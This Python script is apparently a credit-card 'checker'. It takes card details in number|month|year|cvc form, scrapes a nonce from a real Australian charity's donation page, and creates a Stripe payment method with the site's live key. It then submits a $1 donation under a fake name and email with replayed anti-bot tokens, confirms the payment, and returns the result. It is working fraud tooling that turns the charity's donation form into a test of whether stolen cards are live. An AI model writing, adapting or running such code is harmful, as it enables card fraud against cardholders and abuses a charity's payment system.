import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 4)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'connectinghome.org.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://connectinghome.org.au/donations', headers=headers)
	form_id =re.search(r' name="charitable_form_id" value="(.*?)"',response.text).group(1)
	donation_nonce =re.search(r' name="_charitable_donation_nonce" value="(.*?)"',response.text).group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fd2bf13370b%3B+stripe-js-v3%2Fd2bf13370b%3B+card-element&key=pk_live_51OcIcfIQypluYImwoxkoYcwe3oWDfX8jTqo5cujGK9sab3pLmTuP4UUIY4qfJhuUZ1moOnp7WRBcLXm7Db1Wvop800dcOErogh'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	pm=response.json()['id']
	
	headers = {
	    'authority': 'connectinghome.org.au',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://connectinghome.org.au',
	    'referer': 'https://connectinghome.org.au/donations',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'charitable_form_id': f'{form_id}',
	    f'{form_id}': '',
	    '_charitable_donation_nonce': f'{donation_nonce}',
	    '_wp_http_referer': '/donations',
	    'campaign_id': '1092',
	    'description': 'Donations',
	    'ID': '0',
	    'gateway': 'stripe',
	    'donation_amount': 'custom',
	    'custom_donation_amount': '1.00',
	    'recurring_donation': 'once',
	    'first_name': 'Xssa',
	    'last_name': 'Gon',
	    'company_name': '',
	    'email': 'xssagon@outlook.com',
	    'address': '',
	    'address_2': '',
	    'city': '',
	    'state': '',
	    'postcode': '',
	    'country': 'AU',
	    'phone': '',
	    'stripe_payment_method': f'{pm}',
	    'apbct__email_id__elementor_form': '',
	    'ct_bot_detector_event_token': '5baa893b676b25512ee536a080f9ed693c6c744d81944bbe4e3fa5c5c269ca10',
	    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiY3VzdG9tX2RvbmF0aW9uX2Ftb3VudCBmaXJzdF9uYW1lIGxhc3RfbmFtZSBjb21wYW55X25hbWUgZW1haWwgYWRkcmVzcyBhZGRyZXNzXzIgY2l0eSBzdGF0ZSBwb3N0Y29kZSBjb3VudHJ5IHBob25lIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjEyLCJpbnZpc2libGVfZmllbGRzIjoiY2hhcml0YWJsZV9mb3JtX2lkIDZhZTJiMTYyYzU5YzQgX2NoYXJpdGFibGVfZG9uYXRpb25fbm9uY2UgX3dwX2h0dHBfcmVmZXJlciBjaGFyaXRhYmxlX2FjdGlvbiBjYW1wYWlnbl9pZCBkZXNjcmlwdGlvbiBJRCBnYXRld2F5IGdhdGV3YXkgc3RyaXBlX3BheW1lbnRfbWV0aG9kIGFwYmN0X19lbWFpbF9pZF9fZWxlbWVudG9yX2Zvcm0gY3RfYm90X2RldGVjdG9yX2V2ZW50X3Rva2VuIGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoxNH19',
	    'ct_no_cookie_hidden_field': '_ct_no_cookie_data_eyJhcGJjdF9leGlzdGluZ192aXNpdG9yIjoxLCJhcGJjdF9oZWFkbGVzcyI6ZmFsc2UsImFwYmN0X3Zpc2libGVfZmllbGRzIjoiMCIsImFwYmN0X291dHNpZGVfZnVuY3Rpb25hbF9wcm90ZWN0ZWRfdGFnc19fRElWIjoiW10iLCJjdF9ma3BfdGltZXN0YW1wIjoiMCIsImN0X3NjcmVlbl9pbmZvIjoiIiwiY3RfY2hlY2tqcyI6Ijc1YTFiNGJjZDg4MGYzMDI4ODgzYmVlN2ZmMzJkNWVlNjJhZjQ3ZDdmNjExMjljYzM5YzM2N2IzMWE4NmM2MTIiLCJjdF90aW1lem9uZSI6Ni41LCJjdF9jaGVja2VkX2VtYWlscyI6IntcInhzc2Fnb25Ab3V0bG9vay5jb21cIjp7XCJyZXN1bHRcIjpcIkNBQ0hFRFwiLFwidGltZXN0YW1wXCI6MTc5MzI0MTQ3MH19IiwiY3RfcHNfdGltZXN0YW1wIjoxNzkzMjQxNDQ0LCJhcGJjdF9vdXRzaWRlX2Z1bmN0aW9uYWxfcHJvdGVjdGVkX3RhZ3NfX0lGUkFNRSI6IltdIiwiY3RfcG9pbnRlcl9kYXRhIjoiMCIsImN0X2JvdF9kZXRlY3Rvcl9mcm9udGVuZF9kYXRhX2xvZyI6W1sic3VjY2VzcyIsInRpbWVzdGFtcF9vbl9zZW5kIiwidGltZXN0YW1wX29uX3JlY2VpdmVkIiwiZXZlbnRfdG9rZW4iLCJqc19ldmVudCIsImhvc3RfbmFtZSIsIm5ld19ldmVudF90b2tlbiIsImVycm9yIl0sW3RydWUsMTc5MzI0MTQ0NCwxNzkzMjQxNDQ1LCI1YmFhODkzYjY3NmIyNTUxMmVlNTM2YTA4MGY5ZWQ2OTNjNmM3NDRkODE5NDRiYmU0ZTNmYTVjNWMyNjljYTEwIiwiRE9NQ29udGVudExvYWRlZCIsImxvY2FsaG9zdDozMDAyIiwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsIiJdLFt0cnVlLDE3OTMyNDE0NDcsMTc5MzI0MTQ0NywiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsImNyb25IdWJFdmVudCIsImxvY2FsaG9zdDozMDAyIiwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsIiJdLFt0cnVlLDE3OTMyNDE0NjAsMTc5MzI0MTQ2MSwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsImNyb25IdWJFdmVudCIsImxvY2FsaG9zdDozMDAyIiwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsIiJdLFt0cnVlLDE3OTMyNDE0NjIsMTc5MzI0MTQ2MywiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsImNyb25IdWJFdmVudCIsImxvY2FsaG9zdDozMDAyIiwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsIiJdLFt0cnVlLDE3OTMyNDE0NjQsMTc5MzI0MTQ2NSwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsImNyb25IdWJFdmVudCIsImxvY2FsaG9zdDozMDAyIiwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsIiJdLFt0cnVlLDE3OTMyNDE0NjYsMTc5MzI0MTQ2NywiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsImNyb25IdWJFdmVudCIsImxvY2FsaG9zdDozMDAyIiwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsIiJdXSwiY3RfYm90X2RldGVjdG9yX2V2ZW50X3Rva2VuIjoiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMCIsImN0X2NoZWNrZWRfZW1haWxzX2V4aXN0IjoiMCIsInR5cG8iOltdLCJjb2xsZWN0aW5nX3VzZXJfYWN0aXZpdHlfZGF0YSI6W10sImFwYmN0X2Jyb3dzZXJfc3RhdGUiOiJ7XCJib3RkX2xvZ2ljX2xvYWRlZFwiOjEsXCJib3RkX3dyYXBwZXJfbG9hZGVkXCI6MSxcImZyb250ZW5kX2RhdGFfbG9nXCI6W1tcInN1Y2Nlc3NcIixcInRpbWVzdGFtcF9vbl9zZW5kXCIsXCJ0aW1lc3RhbXBfb25fcmVjZWl2ZWRcIixcImV2ZW50X3Rva2VuXCIsXCJqc19ldmVudFwiLFwiaG9zdF9uYW1lXCIsXCJuZXdfZXZlbnRfdG9rZW5cIixcImVycm9yXCJdLFt0cnVlLDE3OTMyNDE0NDQsMTc5MzI0MTQ0NSxcIjViYWE4OTNiNjc2YjI1NTEyZWU1MzZhMDgwZjllZDY5M2M2Yzc0NGQ4MTk0NGJiZTRlM2ZhNWM1YzI2OWNhMTBcIixcIkRPTUNvbnRlbnRMb2FkZWRcIixcImxvY2FsaG9zdDozMDAyXCIsXCI1YmFhODkzYjY3NmIyNTUxMmVlNTM2YTA4MGY5ZWQ2OTNjNmM3NDRkODE5NDRiYmU0ZTNmYTVjNWMyNjljYTEwXCIsXCJcIl0sW3RydWUsMTc5MzI0MTQ0NywxNzkzMjQxNDQ3LFwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMFwiLFwiY3Jvbkh1YkV2ZW50XCIsXCJsb2NhbGhvc3Q6MzAwMlwiLFwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMFwiLFwiXCJdLFt0cnVlLDE3OTMyNDE0NjAsMTc5MzI0MTQ2MSxcIjViYWE4OTNiNjc2YjI1NTEyZWU1MzZhMDgwZjllZDY5M2M2Yzc0NGQ4MTk0NGJiZTRlM2ZhNWM1YzI2OWNhMTBcIixcImNyb25IdWJFdmVudFwiLFwibG9jYWxob3N0OjMwMDJcIixcIjViYWE4OTNiNjc2YjI1NTEyZWU1MzZhMDgwZjllZDY5M2M2Yzc0NGQ4MTk0NGJiZTRlM2ZhNWM1YzI2OWNhMTBcIixcIlwiXSxbdHJ1ZSwxNzkzMjQxNDYyLDE3OTMyNDE0NjMsXCI1YmFhODkzYjY3NmIyNTUxMmVlNTM2YTA4MGY5ZWQ2OTNjNmM3NDRkODE5NDRiYmU0ZTNmYTVjNWMyNjljYTEwXCIsXCJjcm9uSHViRXZlbnRcIixcImxvY2FsaG9zdDozMDAyXCIsXCI1YmFhODkzYjY3NmIyNTUxMmVlNTM2YTA4MGY5ZWQ2OTNjNmM3NDRkODE5NDRiYmU0ZTNmYTVjNWMyNjljYTEwXCIsXCJcIl0sW3RydWUsMTc5MzI0MTQ2NCwxNzkzMjQxNDY1LFwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMFwiLFwiY3Jvbkh1YkV2ZW50XCIsXCJsb2NhbGhvc3Q6MzAwMlwiLFwiNWJhYTg5M2I2NzZiMjU1MTJlZTUzNmEwODBmOWVkNjkzYzZjNzQ0ZDgxOTQ0YmJlNGUzZmE1YzVjMjY5Y2ExMFwiLFwiXCJdLFt0cnVlLDE3OTMyNDE0NjYsMTc5MzI0MTQ2NyxcIjViYWE4OTNiNjc2YjI1NTEyZWU1MzZhMDgwZjllZDY5M2M2Yzc0NGQ4MTk0NGJiZTRlM2ZhNWM1YzI2OWNhMTBcIixcImNyb25IdWJFdmVudFwiLFwibG9jYWxob3N0OjMwMDJcIixcIjViYWE4OTNiNjc2YjI1NTEyZWU1MzZhMDgwZjllZDY5M2M2Yzc0NGQ4MTk0NGJiZTRlM2ZhNWM1YzI2OWNhMTBcIixcIlwiXV0sXCJ0cmFuc3BvcnRfZW5hYmxlZFwiOjF9In0=',
	    'action': 'make_donation',
	    'form_action': 'make_donation',
	}
	
	response = requests.post('https://connectinghome.org.au/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	try:
		scrt = response.json().get('secret')
		if not scrt:
			return response.text
		pi = re.search(r"(pi_[^_]+)", scrt)
		pi = pi.group(1)
	except Exception:
		return response.text	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51OcIcfIQypluYImwoxkoYcwe3oWDfX8jTqo5cujGK9sab3pLmTuP4UUIY4qfJhuUZ1moOnp7WRBcLXm7Db1Wvop800dcOErogh&client_attribution_metadata[client_session_id]=0f0d6020-28c1-43b2-b93d-34189d69e652&client_attribution_metadata[merchant_integration_source]=l1&client_secret={scrt}'
	
	response = requests.post(
	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
	    headers=headers,
	    data=data,
	    )
	
	return response.text